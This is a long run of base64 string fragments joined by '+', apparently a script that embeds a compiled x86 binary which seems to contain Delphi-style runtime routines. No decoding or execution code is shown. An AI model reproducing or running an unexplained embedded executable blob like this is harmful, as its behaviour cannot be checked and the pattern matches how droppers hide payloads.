'X8OLwOsIhMl1AzPAw0APtgg60XXxw4vAV1ZTCcB0RAnSdECJw4nXMsC5//////Ku99FJdC6Jzonfuf/////yrvfRKfF2HYnfjV7/idas8q51EYnIV4nZ86ZficF17Y1H/+sCMcBbXl/DjUAAU4vYg8MEi8Po85n//4kYg8AEW8NTVovYhdt1BTPAXlvDi8PofP7//4vwRovG6M7///+LzovT6K3+//9eW8OLwFNWV4PE2IvZi/KL+IP7H3YFux8A' + 
'AACL00qLxugkNgAAPAF1AUuLxIvLi9boeP7//8YEHACLxIlEJCDGRCQkBo1UJCCLBL2EGEMAM8noR/H//4PEKF9eW8NTiw00J0MAgzkAdAyLHTQnQwCLG//TW8OwEOiZmv//W8ONQABTi9iLw+jesv//W8NVi+yDxJRTM9uJXexTVleJx4nOMcCJRfwDTRCJffgxwIlF9IlF8IlF7AnSdA05znQJrDwldA6qSnXzifgrRfjpIwMAADnOdPKsPCV0' + 
'6Y1e/old6IhF5zwtdQU5znTcrOh+AAAAPDp1Cold9DnOdMus6+GJXeC7/////zwudQo5znS4rOhaAAAAiV3ciXXYUVLolQAAAFqLXeApy3MCMduAfectdQopynMEAdEx0vOkh9kpynMEAdEx0rAg86qH2SnKcwQB0THS86SDffAAdApSjUXw6Bz///9aWYt12OlH////Mds8KnQiPDByPTw5dzlp2woAAAAsMA+2wAHDOc50A6zr5FjpMP///4tF' + 
'9DtFCH8S/0X0i10MgHzDBACLHMN0AjHbOc503KzDJN+IwbgBAAAAi130O10If1z/RfSLdQyNNN6LBg+2VgT/JJVFlkAA1pZAAImWQAAPl0AA1pdAAD+XQAC3l0AAl5dAAImWQACJlkAAiZZAAFCXQAB7l0AA0pdAAB6XQACJlkAAV5dAAKCWQAAxwOi7AQAAi1Xoi03YKdGLXfzozP3//411t4tV3IP6IHYCMdKJy4DpRA+E/PX//7kQAAAAgPtY' + 
'D4Tu9f//uQoAAACA+1UPhOD1///rs411p4tV3InLg/oQdgIx0oDpRA+EWvX//7kQAAAAgPtYD4RM9f//uQoAAACA+1UPhD71///pev///4D5Uw+Fcf///7kBAAAAw4D5Uw+FYv///2aDOAF2D4nCjUXw6I39//+LdfDrSjHJw4D5Uw+FQf///4nGrA+2yOs9vvhJQADrBb5YSkAAA3X8gPlTD4Uh////icKNRexTi138/9Zbi3XsifDrC4D5Uw+F' + 
'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' + 
